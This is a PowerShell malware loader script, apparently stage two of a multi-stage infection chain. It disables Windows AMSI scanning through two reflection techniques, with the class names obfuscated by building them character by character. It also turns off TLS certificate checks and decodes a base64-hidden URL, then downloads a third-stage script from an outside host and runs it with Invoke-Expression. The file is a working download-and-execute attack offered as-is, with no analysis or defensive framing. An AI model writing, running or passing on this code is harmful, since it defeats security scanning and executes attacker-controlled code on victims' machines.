param()

$VIS = $true   # will be replaced by sed

function Write-Log {
    param([string]$Msg)
    if ($VIS) {
        $logPath = "$env:TEMP\stage2_debug.txt"
        "$(Get-Date -Format 'HH:mm:ss') - $Msg" | Out-File -FilePath $logPath -Append
        Write-Host "[Stage2] $Msg" -ForegroundColor Yellow
    }
}

Write-Log "=== Stage2 Started ==="

# ---------- Multi‑layer AMSI bypass ----------
try {
    # Build strings with concatenation + character encoding
    $p1 = [string]::join('', @('S','y','s','t','e','m','.','M','a','n','a','g','e','m','e','n','t','.','A','u','t','o','m','a','t','i','o','n','.'))
    $p2 = [string]::join('', @('A','m','s','i','U','t','i','l','s'))
    $className = $p1 + $p2

    $f1 = [string]::join('', @('a','m','s','i','I','n','i','t','F','a','i','l','e','d'))
    $fieldName = $f1

    $amsi = [Ref].Assembly.GetType($className)
    if ($amsi) {
        $field = $amsi.GetField($fieldName, 'NonPublic,Static')
        if ($field) {
            $field.SetValue($null, $true)
            Write-Log "AMSI bypassed (technique 1)"
        }
    }
} catch {
    Write-Log "AMSI technique 1 failed"
}

# Second technique – direct patching via reflection (fallback)
try {
    $t = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
    $f = $t.GetField('amsiInitFailed', 'NonPublic,Static')
    if ($f) {
        $f.SetValue($null, $true)
        Write-Log "AMSI bypassed (technique 2)"
    }
} catch {
    Write-Log "AMSI technique 2 failed"
}
# -------------------------------------------------

# ---------- TLS 1.2 ----------
try {
    [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072
    [System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }
} catch {
    Write-Log "TLS config failed"
}

# ---------- Decode URL ----------
$b64Url = "aHR0cHM6Ly9kb21lbmNhLnZlcmNlbC5hcHAvZ2VuZXJhdGVk"
try {
    $baseUrl = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($b64Url))
    $stage3Url = $baseUrl + "/payloads/stage3.ps1"
    Write-Log "Stage3 URL: $stage3Url"
} catch {
    Write-Log "URL decode failed"
    exit
}

# ---------- Download Stage3 ----------
$downloaded = $false
for ($i=1; $i -le 3; $i++) {
    try {
        Write-Log "Download attempt $i"
        $wc = New-Object System.Net.WebClient
        $wc.Headers.Add('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36')
        $script = $wc.DownloadString($stage3Url)
        Write-Log "Downloaded $($script.Length) bytes"
        $downloaded = $true
        break
    } catch {
        Write-Log "Attempt $i failed: $($_.Exception.Message)"
        Start-Sleep -Seconds 2
    }
}

if ($downloaded) {
    try {
        Write-Log "Executing Stage3..."
        Invoke-Expression $script
        Write-Log "Stage3 execution initiated"
    } catch {
        Write-Log "Stage3 execution failed: $($_.Exception.Message)"
    }
} else {
    Write-Log "All download attempts failed"
}

Write-Log "=== Stage2 Completed ==="
